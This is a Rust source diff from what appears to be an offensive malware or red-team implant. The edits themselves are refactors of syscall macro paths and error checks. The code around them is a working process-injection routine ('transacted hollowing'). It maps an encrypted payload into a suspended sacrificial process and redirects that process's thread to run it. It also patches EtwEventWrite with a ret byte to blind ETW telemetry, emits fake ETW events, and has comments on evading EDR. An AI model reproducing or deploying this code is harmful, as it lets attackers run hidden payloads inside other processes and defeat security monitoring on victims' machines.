@@ -418,7 +418,7 @@ unsafe fn rollback_transaction(tx: &TransactionHandle) -> Result<(), String> {
 
 /// Close a transaction handle.
 unsafe fn close_handle(handle: usize) {
-    let _ = syscall!("NtClose", handle as u64);
+    let _ = crate::syscall!("NtClose", handle as u64);
 }
 
 // ── Page alignment helper ────────────────────────────────────────────────────
@@ -464,7 +464,7 @@ unsafe fn find_remote_ntdll(
     // expected address.
     let mut buf = [0u8; 2];
     let mut bytes_read: usize = 0;
-    let read_status = syscall!(
+    let read_status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         local_ntdll as u64,
@@ -493,7 +493,7 @@ unsafe fn resolve_remote_export(
     // Read DOS header.
     let mut dos_header = [0u8; 0x40];
     let mut bytes_read: usize = 0;
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         module_base as u64,
@@ -501,7 +501,7 @@ unsafe fn resolve_remote_export(
         0x40u64,
         &mut bytes_read as *mut _ as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err("failed to read DOS header from target".to_string());
     }
     if dos_header[0] != b'M' || dos_header[1] != b'Z' {
@@ -518,7 +518,7 @@ unsafe fn resolve_remote_export(
     // Read PE header + optional header.
     let pe_offset = e_lfanew;
     let mut pe_buf = [0u8; 0x100]; // Enough for PE sig + COFF + optional header
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         (module_base + pe_offset) as u64,
@@ -526,7 +526,7 @@ unsafe fn resolve_remote_export(
         0x100u64,
         &mut bytes_read as *mut _ as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err("failed to read PE header from target".to_string());
     }
 
@@ -558,7 +558,7 @@ unsafe fn resolve_remote_export(
     // Read export directory.
     let export_dir_addr = module_base + export_dir_rva as usize;
     let mut export_dir = [0u8; 40]; // IMAGE_EXPORT_DIRECTORY is 40 bytes
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         export_dir_addr as u64,
@@ -566,7 +566,7 @@ unsafe fn resolve_remote_export(
         40u64,
         &mut bytes_read as *mut _ as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err("failed to read export directory from target".to_string());
     }
 
@@ -578,7 +578,7 @@ unsafe fn resolve_remote_export(
     // Read the name pointer table.
     let names_size = num_names * 4;
     let mut name_ptrs = vec![0u32; num_names];
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         (module_base + names_rva) as u64,
@@ -586,7 +586,7 @@ unsafe fn resolve_remote_export(
         (names_size as u64),
         &mut bytes_read as *mut _ as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err("failed to read export name pointers from target".to_string());
     }
 
@@ -602,7 +602,7 @@ unsafe fn resolve_remote_export(
         let name_rva = name_ptrs[i] as usize;
         // Read the name (up to 128 bytes, stop at null).
         let mut name_buf = [0u8; 128];
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtReadVirtualMemory",
             process_handle as u64,
             (module_base + name_rva) as u64,
@@ -610,7 +610,7 @@ unsafe fn resolve_remote_export(
             128u64,
             &mut bytes_read as *mut _ as u64,
         );
-        if status.is_err() || status.unwrap() < 0 {
+        if status.as_ref().map_or(true, |s| *s < 0) {
             continue;
         }
 
@@ -619,7 +619,7 @@ unsafe fn resolve_remote_export(
         if &name_buf[..name_len] == &name_with_null[..name_with_null.len().saturating_sub(1)] {
             // Found it! Read the ordinal.
             let mut ordinal_buf = [0u16; 1];
-            let status = syscall!(
+            let status = crate::syscall!(
                 "NtReadVirtualMemory",
                 process_handle as u64,
                 (module_base + ordinals_rva + i * 2) as u64,
@@ -627,7 +627,7 @@ unsafe fn resolve_remote_export(
                 2u64,
                 &mut bytes_read as *mut _ as u64,
             );
-            if status.is_err() || status.unwrap() < 0 {
+            if status.as_ref().map_or(true, |s| *s < 0) {
                 continue;
             }
 
@@ -635,7 +635,7 @@ unsafe fn resolve_remote_export(
 
             // Read the function RVA from the function table.
             let mut func_rva_buf = [0u32; 1];
-            let status = syscall!(
+            let status = crate::syscall!(
                 "NtReadVirtualMemory",
                 process_handle as u64,
                 (module_base + functions_rva + ordinal * 4) as u64,
@@ -643,7 +643,7 @@ unsafe fn resolve_remote_export(
                 4u64,
                 &mut bytes_read as *mut _ as u64,
             );
-            if status.is_err() || status.unwrap() < 0 {
+            if status.as_ref().map_or(true, |s| *s < 0) {
                 continue;
             }
 
@@ -678,7 +678,7 @@ unsafe fn patch_remote_etw(
     // Read the original first byte.
     let mut orig_byte = [0u8; 1];
     let mut bytes_read: usize = 0;
-    let read_status = syscall!(
+    let read_status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         etw_write_addr as u64,
@@ -687,7 +687,7 @@ unsafe fn patch_remote_etw(
         &mut bytes_read as *mut _ as u64,
     );
 
-    if read_status.is_err() || read_status.unwrap() < 0 {
+    if read_status.as_ref().map_or(true, |s| *s < 0) {
         return Err("failed to read original EtwEventWrite byte from target".to_string());
     }
 
@@ -712,7 +712,7 @@ unsafe fn patch_remote_etw(
     let mut protect_base: usize = etw_write_addr;
     let mut protect_size: usize = 1;
     let mut old_protect: u32 = 0;
-    let protect_status = syscall!(
+    let protect_status = crate::syscall!(
         "NtProtectVirtualMemory",
         process_handle as u64,
         &mut protect_base as *mut _ as u64,
@@ -721,7 +721,7 @@ unsafe fn patch_remote_etw(
         &mut old_protect as *mut _ as u64,
     );
 
-    if protect_status.is_err() || protect_status.unwrap() < 0 {
+    if protect_status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtProtectVirtualMemory(RW) for ETW patch failed: status={:?}",
             protect_status
@@ -731,7 +731,7 @@ unsafe fn patch_remote_etw(
     // Write the ret instruction (0xC3) via NtWriteVirtualMemory.
     let patch_byte: u8 = 0xC3;
     let mut bytes_written: usize = 0;
-    let write_status = syscall!(
+    let write_status = crate::syscall!(
         "NtWriteVirtualMemory",
         process_handle as u64,
         etw_write_addr as u64,
@@ -744,7 +744,7 @@ unsafe fn patch_remote_etw(
     let mut restore_base: usize = etw_write_addr;
     let mut restore_size: usize = 1;
     let mut dummy_protect: u32 = 0;
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtProtectVirtualMemory",
         process_handle as u64,
         &mut restore_base as *mut _ as u64,
@@ -753,7 +753,7 @@ unsafe fn patch_remote_etw(
         &mut dummy_protect as *mut _ as u64,
     );
 
-    if write_status.is_err() || write_status.unwrap() < 0 {
+    if write_status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtWriteVirtualMemory for ETW patch failed: status={:?}",
             write_status
@@ -781,7 +781,7 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
     let mut protect_base: usize = ctx.etw_write_addr;
     let mut protect_size: usize = 1;
     let mut old_protect: u32 = 0;
-    let protect_status = syscall!(
+    let protect_status = crate::syscall!(
         "NtProtectVirtualMemory",
         ctx.process_handle as u64,
         &mut protect_base as *mut _ as u64,
@@ -790,7 +790,7 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
         &mut old_protect as *mut _ as u64,
     );
 
-    if protect_status.is_err() || protect_status.unwrap() < 0 {
+    if protect_status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtProtectVirtualMemory(RW) for ETW restore failed: status={:?}",
             protect_status
@@ -798,7 +798,7 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
     }
 
     let mut bytes_written: usize = 0;
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtWriteVirtualMemory",
         ctx.process_handle as u64,
         ctx.etw_write_addr as u64,
@@ -811,7 +811,7 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
     let mut restore_base: usize = ctx.etw_write_addr;
     let mut restore_size: usize = 1;
     let mut dummy_protect: u32 = 0;
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtProtectVirtualMemory",
         ctx.process_handle as u64,
         &mut restore_base as *mut _ as u64,
@@ -820,7 +820,7 @@ unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
         &mut dummy_protect as *mut _ as u64,
     );
 
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "failed to restore target EtwEventWrite: status={:?}",
             status
@@ -929,7 +929,7 @@ unsafe fn emit_fake_etw_events(
         // Write provider GUID.
         let mut bytes_written: usize = 0;
         let guid_addr = remote_base + offset;
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtWriteVirtualMemory",
             process_handle as u64,
             guid_addr as u64,
@@ -941,7 +941,7 @@ unsafe fn emit_fake_etw_events(
 
         // Write user data.
         let data_addr = remote_base + offset;
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtWriteVirtualMemory",
             process_handle as u64,
             data_addr as u64,
@@ -1044,18 +1044,18 @@ unsafe fn create_suspended_process(
     let image_base = match read_process_image_base(process_handle) {
         Ok(ib) => ib,
         Err(e) => {
-            let _ = syscall!("NtTerminateProcess", process_handle as u64, 1u64);
-            let _ = syscall!("NtClose", process_handle as u64);
-            let _ = syscall!("NtClose", thread_handle as u64);
+            let _ = crate::syscall!("NtTerminateProcess", process_handle as u64, 1u64);
+            let _ = crate::syscall!("NtClose", process_handle as u64);
+            let _ = crate::syscall!("NtClose", thread_handle as u64);
             return Err(e);
         }
     };
     let entry_point = match read_process_entry_point(process_handle, image_base) {
         Ok(ep) => ep,
         Err(e) => {
-            let _ = syscall!("NtTerminateProcess", process_handle as u64, 1u64);
-            let _ = syscall!("NtClose", process_handle as u64);
-            let _ = syscall!("NtClose", thread_handle as u64);
+            let _ = crate::syscall!("NtTerminateProcess", process_handle as u64, 1u64);
+            let _ = crate::syscall!("NtClose", process_handle as u64);
+            let _ = crate::syscall!("NtClose", thread_handle as u64);
             return Err(e);
         }
     };
@@ -1078,16 +1078,16 @@ unsafe fn create_suspended_process(
 unsafe fn read_process_image_base(process_handle: usize) -> Result<usize, String> {
     // Use NtQueryInformationProcess(ProcessBasicInformation) to get the PEB address.
     let mut pbi: [usize; 6] = [0; 6]; // PROCESS_BASIC_INFORMATION
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtQueryInformationProcess",
         process_handle as u64,
         0u64, // ProcessBasicInformation
         pbi.as_mut_ptr() as u64,
         (std::mem::size_of::<[usize; 6]>() as u64),
-        std::ptr::null_mut() as u64, // ReturnLength = NULL
+        0u64, // ReturnLength = NULL
     );
 
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtQueryInformationProcess failed: status={:?}",
             status
@@ -1103,7 +1103,7 @@ unsafe fn read_process_image_base(process_handle: usize) -> Result<usize, String
     // PEB.ImageBaseAddress is at offset 0x10 (x86-64).
     let mut image_base: usize = 0;
     let mut bytes_read: usize = 0;
-    let read_status = syscall!(
+    let read_status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         (peb_addr + 0x10) as u64,
@@ -1112,7 +1112,7 @@ unsafe fn read_process_image_base(process_handle: usize) -> Result<usize, String
         &mut bytes_read as *mut _ as u64,
     );
 
-    if read_status.is_err() || read_status.unwrap() < 0 || image_base == 0 {
+    if read_status.as_ref().map_or(true, |s| *s < 0) || image_base == 0 {
         return Err(format!(
             "failed to read ImageBaseAddress from PEB: status={:?}",
             read_status
@@ -1130,7 +1130,7 @@ unsafe fn read_process_entry_point(
     // Read the DOS header to get e_lfanew.
     let mut dos_header = [0u8; 0x40];
     let mut bytes_read: usize = 0;
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         image_base as u64,
@@ -1138,7 +1138,7 @@ unsafe fn read_process_entry_point(
         0x40u64,
         &mut bytes_read as *mut _ as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err("failed to read DOS header".to_string());
     }
 
@@ -1152,7 +1152,7 @@ unsafe fn read_process_entry_point(
     // Read the PE optional header to get AddressOfEntryPoint.
     // AddressOfEntryPoint is at offset e_lfanew + 0x28 (PE32+).
     let mut entry_rva_buf = [0u8; 4];
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtReadVirtualMemory",
         process_handle as u64,
         (image_base + e_lfanew + 0x28) as u64,
@@ -1160,7 +1160,7 @@ unsafe fn read_process_entry_point(
         4u64,
         &mut bytes_read as *mut _ as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err("failed to read AddressOfEntryPoint".to_string());
     }
 
@@ -1274,7 +1274,7 @@ unsafe fn create_transacted_section(
     // DesiredAccess: GENERIC_WRITE | SYNCHRONIZE
     // CreateDisposition: FILE_SUPERSEDE
     // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
-    let create_file_status = syscall!(
+    let create_file_status = crate::syscall!(
         "NtCreateFile",
         &mut file_handle as *mut _ as u64,               // FileHandle
         (GENERIC_WRITE | SYNCHRONIZE) as u64,             // DesiredAccess
@@ -1289,7 +1289,7 @@ unsafe fn create_transacted_section(
         0u64,                                              // EaBuffer = NULL
     );
 
-    if create_file_status.is_err() || create_file_status.unwrap() < 0 || file_handle == 0 {
+    if create_file_status.as_ref().map_or(true, |s| *s < 0) || file_handle == 0 {
         return Err(format!(
             "NtCreateFile for transacted temp file failed: status={:?}",
             create_file_status
@@ -1309,7 +1309,7 @@ unsafe fn create_transacted_section(
         information: 0,
     };
 
-    let write_status = syscall!(
+    let write_status = crate::syscall!(
         "NtWriteFile",
         file_handle as u64,                                // FileHandle
         0u64,                                              // Event = NULL
@@ -1322,8 +1322,8 @@ unsafe fn create_transacted_section(
         0u64,                                              // Key = NULL
     );
 
-    if write_status.is_err() || write_status.unwrap() < 0 {
-        let _ = syscall!("NtClose", file_handle as u64);
+    if write_status.as_ref().map_or(true, |s| *s < 0) {
+        let _ = crate::syscall!("NtClose", file_handle as u64);
         return Err(format!(
             "NtWriteFile for transacted temp file failed: status={:?}",
             write_status
@@ -1339,7 +1339,7 @@ unsafe fn create_transacted_section(
     // as PAGE_EXECUTE_READ (map_section_to_target).  Using RWX here would
     // create an RWX section object that is visible to EDR even if the target
     // mapping is RX.
-    let create_section_status = syscall!(
+    let create_section_status = crate::syscall!(
         "NtCreateSection",
         &mut h_section as *mut _ as u64,               // SectionHandle
         SECTION_ALL_ACCESS,                             // DesiredAccess
@@ -1351,9 +1351,9 @@ unsafe fn create_transacted_section(
     );
 
     // ── Step 5: Close file handle (section holds its own reference) ──
-    let _ = syscall!("NtClose", file_handle as u64);
+    let _ = crate::syscall!("NtClose", file_handle as u64);
 
-    if create_section_status.is_err() || create_section_status.unwrap() < 0 || h_section == 0 {
+    if create_section_status.as_ref().map_or(true, |s| *s < 0) || h_section == 0 {
         return Err(format!(
             "NtCreateSection for transacted section failed: status={:?}",
             create_section_status
@@ -1375,7 +1375,7 @@ unsafe fn write_payload_to_section(
     let mut local_base: *mut c_void = std::ptr::null_mut();
     let mut view_size: usize = 0;
 
-    let map_status = syscall!(
+    let map_status = crate::syscall!(
         "NtMapViewOfSection",
         h_section as u64,
         CURRENT_PROCESS,                  // NtCurrentProcess()
@@ -1389,8 +1389,8 @@ unsafe fn write_payload_to_section(
         PAGE_READWRITE,
     );
 
-    if map_status.is_err() || map_status.unwrap() < 0 || local_base.is_null() {
-        let _ = syscall!("NtClose", h_section as u64);
+    if map_status.as_ref().map_or(true, |s| *s < 0) || local_base.is_null() {
+        let _ = crate::syscall!("NtClose", h_section as u64);
         return Err(format!(
             "NtMapViewOfSection(local RW) failed: status={:?}",
             map_status
@@ -1405,7 +1405,7 @@ unsafe fn write_payload_to_section(
     );
 
     // Unmap from our process — the section object retains the data.
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtUnmapViewOfSection",
         CURRENT_PROCESS,
         local_base as u64,
@@ -1426,7 +1426,7 @@ unsafe fn map_section_to_target(
     let mut remote_base: *mut c_void = std::ptr::null_mut();
     let mut view_size: usize = 0;
 
-    let map_status = syscall!(
+    let map_status = crate::syscall!(
         "NtMapViewOfSection",
         h_section as u64,
         process_handle as u64,
@@ -1440,7 +1440,7 @@ unsafe fn map_section_to_target(
         PAGE_EXECUTE_READ,
     );
 
-    if map_status.is_err() || map_status.unwrap() < 0 || remote_base.is_null() {
+    if map_status.as_ref().map_or(true, |s| *s < 0) || remote_base.is_null() {
         return Err(format!(
             "NtMapViewOfSection(remote RX) failed: status={:?}",
             map_status
@@ -1466,24 +1466,24 @@ unsafe fn redirect_thread(
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtGetContextThread",
         thread_handle as u64,
         &mut ctx as *mut _ as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err("NtGetContextThread failed".to_string());
     }
 
     // Set RIP to the payload address.
     ctx.Rip = payload_addr as u64;
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtSetContextThread",
         thread_handle as u64,
         &ctx as *const _ as u64,
     );
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err("NtSetContextThread failed".to_string());
     }
 
@@ -1496,13 +1496,13 @@ unsafe fn redirect_thread(
 
 /// Resume a suspended thread.
 unsafe fn resume_thread(thread_handle: usize) -> Result<(), String> {
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtResumeThread",
         thread_handle as u64,
-        std::ptr::null_mut() as u64, // PreviousSuspendCount = NULL
+        0u64, // PreviousSuspendCount = NULL
     );
 
-    if status.is_err() || status.unwrap() < 0 {
+    if status.as_ref().map_or(true, |s| *s < 0) {
         return Err(format!(
             "NtResumeThread failed: status={:?}",
             status
@@ -1583,7 +1583,7 @@ pub unsafe fn inject_transacted_hollowing(
     let guarded_payload = encrypt_payload_in_transit(payload);
 
     write_payload_to_section(h_section, &guarded_payload).map_err(|reason| {
-        let _ = syscall!("NtClose", h_section as u64);
+        let _ = crate::syscall!("NtClose", h_section as u64);
         close_handle(tx.handle);
         InjectionError::InjectionFailed {
             technique: technique.clone(),
@@ -1594,7 +1594,7 @@ pub unsafe fn inject_transacted_hollowing(
     // ── Step 4: Create suspended process ──────────────────────────────
     let sacrificial_path = get_sacrificial_path();
     let target = create_suspended_process(&sacrificial_path).map_err(|reason| {
-        let _ = syscall!("NtClose", h_section as u64);
+        let _ = crate::syscall!("NtClose", h_section as u64);
         close_handle(tx.handle);
         InjectionError::InjectionFailed {
             technique: technique.clone(),
@@ -1616,7 +1616,7 @@ pub unsafe fn inject_transacted_hollowing(
                 // Allocate a small region in the target for fake ETW event data.
                 let mut fake_region_base: usize = 0;
                 let mut region_size: usize = 0x1000; // One page for fake event data
-                let alloc_status = syscall!(
+                let alloc_status = crate::syscall!(
                     "NtAllocateVirtualMemory",
                     target.process_handle as u64,
                     &mut fake_region_base as *mut _ as u64,
@@ -1650,14 +1650,14 @@ pub unsafe fn inject_transacted_hollowing(
                 let _ = restore_remote_etw(ctx);
             }
             // Terminate the suspended process.
-            let _ = syscall!(
+            let _ = crate::syscall!(
                 "NtTerminateProcess",
                 target.process_handle as u64,
                 1u64 // Exit status
             );
-            let _ = syscall!("NtClose", target.process_handle as u64);
-            let _ = syscall!("NtClose", target.thread_handle as u64);
-            let _ = syscall!("NtClose", h_section as u64);
+            let _ = crate::syscall!("NtClose", target.process_handle as u64);
+            let _ = crate::syscall!("NtClose", target.thread_handle as u64);
+            let _ = crate::syscall!("NtClose", h_section as u64);
             close_handle(tx.handle);
             InjectionError::InjectionFailed {
                 technique: technique.clone(),
@@ -1677,14 +1677,14 @@ pub unsafe fn inject_transacted_hollowing(
         if let Some(ref ctx) = etw_ctx {
             let _ = restore_remote_etw(ctx);
         }
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtTerminateProcess",
             target.process_handle as u64,
             1u64
         );
-        let _ = syscall!("NtClose", target.process_handle as u64);
-        let _ = syscall!("NtClose", target.thread_handle as u64);
-        let _ = syscall!("NtClose", h_section as u64);
+        let _ = crate::syscall!("NtClose", target.process_handle as u64);
+        let _ = crate::syscall!("NtClose", target.thread_handle as u64);
+        let _ = crate::syscall!("NtClose", h_section as u64);
         close_handle(tx.handle);
         InjectionError::InjectionFailed {
             technique: technique.clone(),
@@ -1719,9 +1719,9 @@ pub unsafe fn inject_transacted_hollowing(
     }
 
     resume_thread(target.thread_handle).map_err(|reason| {
-        let _ = syscall!("NtClose", target.process_handle as u64);
-        let _ = syscall!("NtClose", target.thread_handle as u64);
-        let _ = syscall!("NtClose", h_section as u64);
+        let _ = crate::syscall!("NtClose", target.process_handle as u64);
+        let _ = crate::syscall!("NtClose", target.thread_handle as u64);
+        let _ = crate::syscall!("NtClose", h_section as u64);
         InjectionError::InjectionFailed {
             technique: technique.clone(),
             reason,
@@ -1737,7 +1737,7 @@ pub unsafe fn inject_transacted_hollowing(
     // ── Cleanup and return ────────────────────────────────────────────
     // Don't close section handle yet — the target has a mapping that
     // references it. The handle will be cleaned up when the target exits.
-    let _ = syscall!("NtClose", h_section as u64);
+    let _ = crate::syscall!("NtClose", h_section as u64);
 
     Ok(InjectionHandle {
         target_pid: target.pid,
